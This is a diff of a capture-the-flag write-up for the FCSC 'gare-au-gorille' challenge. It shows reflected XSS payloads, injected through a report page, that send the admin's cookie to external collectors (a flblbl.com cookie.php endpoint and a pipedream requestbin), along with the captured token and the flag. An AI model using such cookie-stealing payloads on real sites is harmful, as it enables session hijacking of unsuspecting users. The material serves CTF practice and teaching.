@@ -5,28 +5,21 @@ It also has a kind of pgSQL misconfiguration as a ; throws an error, but there d
 We look at the other attack vector we have : the report page
 
 It takes an url and apparently logs it somewhere for "review".
-We can use it to steal the admin's cookie
-We set up a nice trap on our server to dump in a file all cookies received
+We can use probably use it to steal the admin's cookie
+We set up an endpoint on requestbin to get our admin cookie
 
 Then we forge our payload
 
-https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/flag?search=<script>window.location.href="http://flblbl.com/hack/cookie.php?"+document.cookie</script>
+https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=<img onload=this.src='https://eoulvrfdli1718o.m.pipedream.net?c='+document.cookie src="https://github.com/favicon.ico"/>
 
-https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/flag?search=<script>window.location.replace("http://flblbl.com/hack/cookie.php?"+document.cookie)</script>
+This works but returns an empty string as cookie. Maybe the URL encoding replaces the + with a space so the variable isnt appended ? Lets try with a no-concat syntax
 
-We wait for the 'admin' to open it and we get
-nothing
+https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=<img onload=this.src=`https://eoulvrfdli1718o.m.pipedream.net?c=${document.cookie}` src="https://github.com/favicon.ico"/>
 
-We can also try
+Yields a result in our requestbin :
 
-https://gare-au-gorille.france-cybersecurity-challenge.fr/?search=%3Cimg%20src=%22static/meme_03.jpg%22/%3E
+token=O9Mv3sFaQD1UpQRLCXVOCzCi0dRbpz4Wy4kGPngZt36MZnR6xZpbHLQRWfDi6T45
 
+We try to access /flag with the browser's "edit headers" request to add the admin token instead of ours, the page displays the flag (but still no meme :()
 
-https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/flag?search=<script>$.get("http://flblbl.com/hack/cookie.php?"+document.cookie)</script>
-
-We need to disable CSRF to send something like
-$.post("http://flblbl.com/hack/cookie.php",{c:document.cookie},dataType:"jsonp",headers={"Access-Control-Allow-Origin":"*","accept":"application/json"})
-
-https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/flag?search=<script>$.post("http://flblbl.com/hack/cookie.php",{c:document.cookie},crossDomain=true)</script>
-
-"Access-Control-Allow-Origin":"*"
+FCSC{14b15680de4e305b89eaa2a07b137abf4e39b5773f39a4ea7155ca5387c6f59e}
